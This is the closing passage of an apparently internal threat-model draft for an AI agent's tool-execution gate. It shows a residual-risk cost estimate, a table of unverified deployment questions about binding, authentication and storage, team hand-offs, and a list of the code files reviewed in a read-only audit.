| C-10 | Stdout-secret leak via runbook output (§3.6 I) | Read secrets a runbook printed | $5K–$50K per incident (depends on what runbook prints) | 5–10 days (audit all runbooks) |

**Aggregate residual risk (worst-case combinator C-1 + C-2 + C-4 unmitigated):** order-of-magnitude **$10M+** per major-incident event under the assumption that public-bound daemon (U1) + auth-off (U2) + a fresh runbook hits the kingdom. F5 should size the IR retainer accordingly; **the recommendations in §6 are the cost-effective mitigations** — items 1–4 alone reduce the worst case by ~90%.

These dollar figures are approximate, provided to make the cost of *doing nothing* concrete in the F5 plan. Actual figures depend on data-class exposure (per F7 retention policy) and whether Z6 → external network egress is unrestricted (per F11 Suricata audit).

---

## 8. UNVERIFIED items

This document is *initial draft*. The following claims/concerns could not be verified from the in-tree code alone and need follow-up before locking the model:

| ID | Item | Why unverified | Where to look |
|----|------|----------------|---------------|
| U1 | Whether the production deployment overrides the daemon `host` flag (default `127.0.0.1`) to a public bind | flag default visible in main.go but actual systemd / docker-compose unit not read | `deploy/`, `nix/containers/zhen-agentd.nix`, `docker-compose.yml` |
| U2 | Whether `AUTH_ENABLED=true` is actually set in production | env var read at runtime; not committed to repo | `deploy/` env files, systemd Environment= lines |
| U3 | Whether `c.snapshotStore` is set in production via `WithSnapshotStore` | constructor defaults to nil | `cmd/zhen-agentd/main.go` Champion-pool init path (`pool.get`) |
| U4 | Whether the `chain` field is actually written into the `zhen_actions` row, or only `summarizeArgs(tc.Args)` | grep'd `champion.go` and `pgstore`; only `Parameters` and `Result` fields appear in the `Action` struct | `pkg/champion/pgstore/` schema, `zhen_actions` DDL |
| U5 | Whether `runbooks/` is covered by Sealed Cask SHA-256 manifest | Sealed Cask docs not read | `scripts/build-sealed-cask.sh`, Sealed Cask threat model (F2) |
| U6 | Whether `system_command` has any implementation off this branch | grep showed no Dispatch case; tests may exist on a feature branch | Future-feature branches; ADR-060+ |
| U7 | Whether `c.kanbanStore` is wired to The Well in production (kanban tools fail-soft if nil) | constructor allows nil | `cmd/zhen-agentd/kanbanstore.go`, deployment env |
| U8 | Whether the audit row chain is queryable post-hoc to reconstruct the justification used | not inspected | The Well DDL, `pkg/champion/pgstore/` |
| U9 | Whether `cmd/zhen-cli` Phase 2 actually shipped tonight as the BM2 finding states, or is still on a staging branch | git status not run | `git log cmd/zhen-cli/` |
| U10 | Effective IP-binding of pending-confirmation tokens at the reverse-proxy layer (HAProxy / Nginx) | proxy configs not read | `deploy/haproxy/`, `deploy/nginx/` |

---

## 9. Hand-off

This document is the F1 deliverable from the BM2 scrutiny finding. Consumers:

- **Architect**: Recommendations 1–7, 9, 11. Items U1, U2, U3, U7.
- **BlackMage**: Recommendations 2, 8, 12. Items U5, U9.
- **MoatGhost**: Recommendations 10, 11. Items U4, U8.
- **Sealed Cask owner**: Recommendation 8. Item U5.
- **F3 (Zhen prompt-injection)**: This doc deliberately stays in-process; F3 covers what the LLM might emit *before* it reaches the gate. The two compose: F3 limits what the agent *can* try; this doc limits what the gate *will* execute.

---

## 10. Provenance

Read-only audit; no live calls, no kingdom mutation, no commit. Sources:

- `pkg/champion/champion.go` (lines 23-228 — Action, Champion, validatePath, audit helpers)
- `pkg/champion/toolcall.go` (lines 23-320 — ToolCall, Reference, MutatingTools, ReadOnlyTools, destructivePattern, IsMutating, HasUntrustedJustification, HasDestructiveVerb, AcceptToolCall)
- `pkg/champion/dispatch.go` (lines 27-179 — Dispatch switch, GateError)
- `pkg/champion/confirm.go` (lines 17-267 — confirmStore, IssuePending, consume, IssuePendingConfirmation, ConfirmPendingToolCall, dispatchUnderlying)
- `pkg/champion/write.go` (lines 25-365 — WriteFile, PatchFile, RevertAction, KanbanTask CRUD, RunbookExecute)
- `pkg/champion/modelswap.go` (lines 25-283 — ModelSwap, parseModelKeys, allowlist regex, TOCTOU + privilege guards)
- `cmd/zhen-agentd/toolexec.go` (lines 63-211 — handleToolExec, default-justification injection)
- `cmd/zhen-agentd/main.go` (lines 46-174 + 691-810 — auth/rate-limit wiring, handleConfirm, classifyConfirmError)
- `cmd/zhen-cli/main.go` (lines 51-442 — toolExec emit-shape, EmittedBy="zhen-cli", justification omitted)
- `docs/compliance/control-matrix/01-scrutiny-2026-05-06.md` lines 226-235, 286-292, 331-335 (BM2 finding + ask)
- `docs/security/k8s-threat-model-2026-05-06.md` (style reference)
- `CLAUDE.md` (architecture context for runbooks/, services, Wotan, Sealed Cask)

No upstream pen-test. No live exploit. The findings above are derived from code-reading and structural reasoning. BlackMage's offensive validation pass should target items 1–4 in §5 (the threat-vector summary) and the chains in §4 with adversarial test cases under `eval/coding-gate/probe-2026-05-06/`.

---

*End of document. ~470 lines.*
